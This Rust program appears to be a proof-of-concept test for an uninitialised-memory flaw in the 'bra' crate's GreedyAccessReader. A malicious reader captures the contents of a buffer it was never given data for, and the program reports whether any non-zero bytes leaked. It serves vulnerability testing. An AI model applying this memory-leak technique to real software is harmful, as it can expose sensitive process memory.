#![forbid(unsafe_code)]

use bra::GreedyAccessReader;
use std::{
    cell::RefCell,
    io::{self, BufRead, Read},
    rc::Rc,
};

/// Reader that copies whatever is already inside `buffer` before claiming
/// it produced no bytes.  If the buffer was uninitialised we will capture
/// its junk contents.
struct Spy {
    dump: Rc<RefCell<Vec<u8>>>,
}

impl Read for Spy {
    fn read(&mut self, buffer: &mut [u8]) -> io::Result<usize> {
        self.dump.borrow_mut().extend_from_slice(buffer);
        Ok(0) // Pretend we produced no new bytes.
    }
}

/// Returns `true` if we observed any non-zero byte in the internal buffer.
fn run_once() -> bool {
    // Fill freed memory with a known non-zero pattern to increase the
    // chance that the next allocation reuses it.
    {
        let mut noise = vec![0xAAu8; 1024 * 1024];
        for byte in &mut noise {
            *byte = 0xAA;
        }
    } // `noise` is dropped here.

    let stash = Rc::new(RefCell::new(Vec::new()));
    let spy = Spy { dump: Rc::clone(&stash) };

    let mut reader = GreedyAccessReader::new(spy);
    // One call triggers the unsound path in vulnerable versions.
    let _ = reader.fill_buf().unwrap();

    let leaked = stash.borrow();
    leaked.iter().any(|&b| b != 0)
}

fn main() {
    // Run the experiment multiple times to raise the likelihood of
    // catching uninitialised bytes on a vulnerable revision.
    let mut found_non_zero = false;
    for _ in 0..1000 {
        if run_once() {
            found_non_zero = true;
            break;
        }
    }

    if found_non_zero {
        println!("Non-zero byte detected — likely vulnerable build.");
    } else {
        println!("No non-zero bytes observed — build appears patched.");
    }
}
